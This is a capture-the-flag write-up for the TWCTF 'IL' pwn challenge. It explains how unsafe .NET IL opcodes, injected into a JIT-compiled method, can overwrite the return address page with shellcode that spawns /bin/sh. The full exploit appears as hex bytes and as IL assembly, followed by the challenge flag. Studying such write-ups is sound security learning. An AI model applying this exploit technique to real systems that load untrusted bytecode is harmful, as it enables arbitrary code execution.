## IL - pwn - 379 points (10 solves)

### Problem

We're given a Linux binary called `il`, which is a .NET Core stub program that loads a .NET assembly called `il.dll`. We can use dnSpy to decompile `il.dll`. It's very simple: all it does is read up to 2053 bytes of data from `stdin` (base64-encoded), then write those bytes into a specific offset of another .NET assembly called `ilstub.dll`. It then loads the modified binary using `Assembly.load`, grabs the function `IlStub.Stub.Func`, and calls it with the argument `0x1337`.

`ilstub.dll` is also a simple .NET assembly containined the aforementioned function. We can see that the user's input bytes are written directly into the IL bytecode of `IlStub.Stub.Func`. Therefore, we're basically being asked to write some .NET IL code which will read a flag or pop a shell.

### Solution

We discovered that we can use `unsafe` opcodes, as long as they otherwise pass the bytecode verifier (don't use too much stack, don't operate on the wrong types, don't unbalance the stack, etc.). Unsafe opcodes, as the name implies, are opcodes which allow you to read or write through addresses (rather than through references, as safe code would), and therefore completely break the memory safety of the .NET runtime.

It also turns out that the code is fully JITted, which means that there's a lot of `rwx` pages where we could just write shellcode. We have a handy opcode called `ldarga` which loads the address of an argument - a stack address. From `gdb`, we could see that this address was 2 qwords below the saved return address - and the saved return address points to another `rwx` page! So our plan is very simple: use `ldarga` to get the stack address, offset it to point to the return address, load the return address, and write shellcode there. Upon returning, our shellcode would run.

Due to struggles with `ilasm` during the competition, we ended up just manually assembling the exploit into hex:

```
0f 00
; add 8 twice
1e 6e 58
1e 6e 58
; deref stack slot
4c
; write shellcode (dup, ldc.i4, stind.i, then add 4)
25 20 488d 3df9 df 1a 6e 58
25 20 ffff ff48 df 1a 6e 58
25 20 83c7 1531 df 1a 6e 58
25 20 f631 d231 df 1a 6e 58
25 20 c0b0 3b0f df 1a 6e 58
25 20 052f 6269 df 1a 6e 58
25 20 6e2f 7368 df 1a 6e 58
25 20 0000 0000 df 1a 6e 58
; ret - shellcode executed
2a
```

Here's how that looks in IL assembly:

```
	/* 0x0000025C 0F00         */ IL_0000: ldarga.s  arg
	/* 0x0000025E 1E           */ IL_0002: ldc.i4.8
	/* 0x0000025F 6E           */ IL_0003: conv.u8
	/* 0x00000260 58           */ IL_0004: add
	/* 0x00000261 1E           */ IL_0005: ldc.i4.8
	/* 0x00000262 6E           */ IL_0006: conv.u8
	/* 0x00000263 58           */ IL_0007: add
	/* 0x00000264 4C           */ IL_0008: ldind.i8
	/* 0x00000265 25           */ IL_0009: dup
	/* 0x00000266 20488D3DF9   */ IL_000A: ldc.i4    -113406648
	/* 0x0000026B DF           */ IL_000F: stind.i
	/* 0x0000026C 1A           */ IL_0010: ldc.i4.4
	/* 0x0000026D 6E           */ IL_0011: conv.u8
	/* 0x0000026E 58           */ IL_0012: add
	/* 0x0000026F 25           */ IL_0013: dup
	/* 0x00000270 20FFFFFF48   */ IL_0014: ldc.i4    1224736767
	/* 0x00000275 DF           */ IL_0019: stind.i
	/* 0x00000276 1A           */ IL_001A: ldc.i4.4
	/* 0x00000277 6E           */ IL_001B: conv.u8
	/* 0x00000278 58           */ IL_001C: add
	/* 0x00000279 25           */ IL_001D: dup
	/* 0x0000027A 2083C71531   */ IL_001E: ldc.i4    823510915
	/* 0x0000027F DF           */ IL_0023: stind.i
	/* 0x00000280 1A           */ IL_0024: ldc.i4.4
	/* 0x00000281 6E           */ IL_0025: conv.u8
	/* 0x00000282 58           */ IL_0026: add
	/* 0x00000283 25           */ IL_0027: dup
	/* 0x00000284 20F631D231   */ IL_0028: ldc.i4    835858934
	/* 0x00000289 DF           */ IL_002D: stind.i
	/* 0x0000028A 1A           */ IL_002E: ldc.i4.4
	/* 0x0000028B 6E           */ IL_002F: conv.u8
	/* 0x0000028C 58           */ IL_0030: add
	/* 0x0000028D 25           */ IL_0031: dup
	/* 0x0000028E 20C0B03B0F   */ IL_0032: ldc.i4    255570112
	/* 0x00000293 DF           */ IL_0037: stind.i
	/* 0x00000294 1A           */ IL_0038: ldc.i4.4
	/* 0x00000295 6E           */ IL_0039: conv.u8
	/* 0x00000296 58           */ IL_003A: add
	/* 0x00000297 25           */ IL_003B: dup
	/* 0x00000298 20052F6269   */ IL_003C: ldc.i4    1768042245
	/* 0x0000029D DF           */ IL_0041: stind.i
	/* 0x0000029E 1A           */ IL_0042: ldc.i4.4
	/* 0x0000029F 6E           */ IL_0043: conv.u8
	/* 0x000002A0 58           */ IL_0044: add
	/* 0x000002A1 25           */ IL_0045: dup
	/* 0x000002A2 206E2F7368   */ IL_0046: ldc.i4    1752379246
	/* 0x000002A7 DF           */ IL_004B: stind.i
	/* 0x000002A8 1A           */ IL_004C: ldc.i4.4
	/* 0x000002A9 6E           */ IL_004D: conv.u8
	/* 0x000002AA 58           */ IL_004E: add
	/* 0x000002AB 25           */ IL_004F: dup
	/* 0x000002AC 2000000000   */ IL_0050: ldc.i4    0
	/* 0x000002B1 DF           */ IL_0055: stind.i
	/* 0x000002B2 1A           */ IL_0056: ldc.i4.4
	/* 0x000002B3 6E           */ IL_0057: conv.u8
	/* 0x000002B4 58           */ IL_0058: add
	/* 0x000002B5 2A           */ IL_0059: ret
```

When run, we get a shell, so we can `cat flag.txt` to get our flag: `TWCTF{0n3_brINgS_5h4d0W_0nE_BRIng5_LighT}`
